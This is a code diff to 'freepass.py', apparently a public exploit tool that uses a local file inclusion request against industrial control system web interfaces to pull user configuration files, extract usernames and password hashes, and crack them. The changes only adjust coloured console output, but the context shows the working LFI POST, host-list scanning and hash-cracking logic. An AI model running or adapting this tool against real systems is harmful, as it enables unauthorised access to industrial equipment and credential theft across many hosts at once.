@@ -44,9 +44,10 @@ details = '''
  # POC: 	https://www.youtube.com/watch?v=HdkZA1DO08Y 
 
  by:
-   * Fernandez Ezequiel ( @capitan_alfa )
-   * Bertin Jose ( @bertinjoseb )
-'''
+   * Fernandez Ezequiel ( %s )
+   * Bertin Jose ( %s )
+''' %(Colors.GREEN+"@capitan_alfa"+Colors.BLUE,Colors.GREEN+"@bertinjoseb"+Colors.DEFAULT)
+
 parser = argparse.ArgumentParser(prog='freepass.py',
 								description=' [+] Obtain and break the credentials of your industrial control system .', 
 								epilog='[+] Demo: freepass.py --list vdr_alliance/host_list.txt --port 8080',
@@ -81,10 +82,6 @@ def reqLFI(hst, prt):
 	headers["Referer"] 			=  fullHost
 	headers["Connection"] 		= "close"
 	headers["Content-Type"] 	= "application/x-www-form-urlencoded"
-
-
-
-	print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+host
 
 	thePost0 = "page=/&template="+LFI
 	
@@ -126,8 +123,9 @@ if LST:
 		try:
 		# ----------------------------------------------------------------------------- 
 			for nHst in LH:
+				HOST = nHst[:-1]
 				try:
-					users_cfg = reqLFI(nHst[:-1], PRT)
+					users_cfg = reqLFI(HOST, PRT)
 					# ----------------------------------- #
 					userList = ptrUsr.findall(users_cfg)
 					hashList = ptrPass.findall(users_cfg)
@@ -136,7 +134,7 @@ if LST:
 
 					usersTot = len(userList) 
 					credsTot = len(hashList)
-
+					print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+"http://"+Colors.GREEN+(HOST)+Colors.RED+":"+Colors.BLUE+(PRT)+Colors.ORANGE+"/"
 					print title+Colors.DEFAULT
 
 					for nUser in range(0, usersTot):
@@ -157,13 +155,12 @@ if LST:
 					print Colors.ORANGE+" +---------------+-------------------------------------------------------+"+Colors.DEFAULT		
 
 				except Exception:
+					print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+"http://"+Colors.GREEN+(HOST)+Colors.RED+":"+Colors.BLUE+(PRT)+Colors.ORANGE+"/"
 					print Colors.RED+" [ Fail conection ] "+Colors.DEFAULT
 		# ----------------------------------------------------------------------------- 
 		except KeyboardInterrupt:
 			print Colors.RED+'\nInterrupted\n\n'+Colors.DEFAULT
 	        exit(0)
-
-
 
 elif HST: 
 	users_cfg = reqLFI(HST, PRT)
@@ -176,7 +173,7 @@ elif HST:
 	usersTot = len(userList) 
 	credsTot = len(hashList)
 
-	print title
+	print Colors.ORANGE+title+Colors.DEFAULT
 			
 	for nUser in range(0, usersTot):
 
@@ -190,10 +187,9 @@ elif HST:
 		username = userList[nUser]
 		plane = getMD5(hashCred, username)
 
-		print " | "+ username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
+		print Colors.ORANGE+" | "+Colors.DEFAULT + username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
 		
-	print " +------------+----------------------------------------------------------+"+Colors.DEFAULT	
-	#print "\n"
+	print Colors.ORANGE+" +---------------+-------------------------------------------------------+"+Colors.DEFAULT		
 
 else:
 	failOpt = "HOST or HOST_LIST"
